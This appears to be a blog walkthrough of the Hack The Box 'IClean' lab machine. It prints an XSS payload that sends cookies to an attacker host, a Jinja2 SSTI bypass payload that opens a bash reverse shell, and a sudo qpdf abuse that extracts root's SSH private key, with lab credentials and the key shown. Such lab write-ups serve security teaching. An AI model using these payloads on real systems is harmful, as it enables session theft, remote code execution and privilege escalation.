---
layout: post
section-type: post
has-comments: true
title: Hack The Box - IClean
category: tech
tags: ["tutorial"]
---

### Reconnaissance and Initial Steps

#### Nmap

```
sudo nmap -Pn -A 10.10.11.12
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/77342afa-8fe8-4c2c-9e4d-d5107846e910)

```
echo "10.10.11.12 iclean.htb" | sudo tee -a /etc/hosts
```
when i navigate to `http://iclean.htb` it redirect to `http://capiclean.htb` so I added that to `/etc/hosts` and access

```
echo "10.10.11.12 capiclean.htb" | sudo tee -a /etc/hosts
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/047ffcfd-bf87-4ddc-b88d-9d0c742ab331)

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/ef48bed0-5028-4144-a7a2-bf985d38a111)

```
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u "http://capiclean.htb/FUZZ" --hc 404 --hl 348
```
I found a `quote` directory, let's have a look.

I fired up burp suite and capture the requests and tested various input vectors and payloads. and I identified a potential vulnerability that could be exploited further.

first I started python3 http server 
```
python3 -m http.server 1234
```

then put the below payload in the service paratmeter and encoded the payload string by using `Ctrl+U` and send the request.

```
<img src=x onerror=fetch("http://ATTACK_IP:1234/"+document.cookie);>
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/6713ecac-e68e-4f05-b771-cd4c83612b94)

Then after sometime I get the `Cookie`. Yooo!

let's store this cookie using cookie-editor and access the `/dashboard`.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/7b829ff5-2097-45ae-88dc-f431514979e4)

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/2e959db4-2fbc-4a8f-801b-dd8c34a2876c)

Visit http://capiclean.htb/InvoiceGenerator to generate an ID and fill it in casually. The ID generated here is # 3873147880

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/8d38560a-d949-4cc1-95bd-730a1671daba)

Then visit http://capiclean.htb/QRGenerator, fill in the above ID, and a QR code image link will be generated.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/b462ddd3-9e3d-41a1-9711-92ebc09d9288)

and let's use Burpsuite to captures request.

#### Web Exploitation :

During all this Request you will get a POST Request on `/QRGenerator` which is likely Vulnerable to **SSTI** because as it is a **Flask Application it is running Jinja Template in Background**.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/8b714199-da5d-49ab-b4d1-13ae6e64c03a)

To test it I put Basic Payload in qr_link Parameter → `{{7*7}}` and Boom I get `49` in Response

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/86b4b571-b89e-4940-9b9f-d8549a4315ff)

I attempted to exploit further to achieve Remote Code Execution (RCE). However, I discovered that the typical Jinja2 Server-Side Template Injection (SSTI) payload was ineffective. then i found this article and it help to find a bypass payload.

https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/

```
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("bash -c '/bin/bash -i >& /dev/tcp/ATTACK_IP/4444 0>&1'")|attr("read")()}}
```

so first thing i started a netcat listener

```
nc -nlvp 4444
```
then put the payload in the qr_link parameter and use `Ctrl+u` encode it and then send the request.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/13c1e2cc-265a-4a34-9588-9692fec8e15f)

We able to obtain a shell as www-data.


### User Flag

After traversing directories and examining files, I identified the `app.py` file, which inadvertently exposes the MySQL database credentials. Leveraging this discovery, I successfully gained access to the database.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/c7bbb004-0e8b-4ac9-9558-e6a8d1ceb5d0)

```
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
```

before accessing mysql let's harden the shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
```
now let's access the mysql:

```
mysql -h 127.0.0.1 -u iclean -p capiclean
```

```
show tables;
select * from users;
```

Enter the password that we found.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/da5a1618-e423-4c3e-91c1-9cbf37110c08)

Let's use `Cracksation` to crack the hashes. https://crackstation.net/

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/d8da72e6-e58f-44e1-bd47-b9c23fa58549)

so let's use this credential to login as user `consuela`

```
su consuela
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/ecdbe8bd-d166-41b3-bb32-f0b1428a5942)

### Root Flag

```
sudo -l
```
![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/01d97bbc-4987-48f6-bc9d-a0f222a26f90)

So I can ran `qpdf` Command. So after searching in Google I found this documentation.
https://qpdf.readthedocs.io/en/stable/cli.html

First, utilize the `-empty` parameter to create an empty document. Next, employ the `-qdf` parameter to generate a PDF file in QDF mode. Then, utilize the `-add-attachment` parameter to append a file as an attachment to the PDF. This time, employ the root's `id_rsa`, and name the generated file `id_rsa.pdf`.

let's run this command:

```
sudo /usr/bin/qpdf --empty --qdf --add-attachment /root/.ssh/id_rsa -- id_rsa.pdf
```
and it generated `id_rsa.pdf` let's `cat` that.

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/e34d765e-ea11-4276-a868-bf023d9a2aac)

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/0512c977-3190-4e40-b063-e429a0b3953a)

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

let's creat the `id_rsa` file and granting the required privileges with `chmod 600 id_rsa`, I used SSH with the `-i` option to specify the private key and connect to the server

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/ff52607b-1b6d-432c-8d52-1cec082c979e)


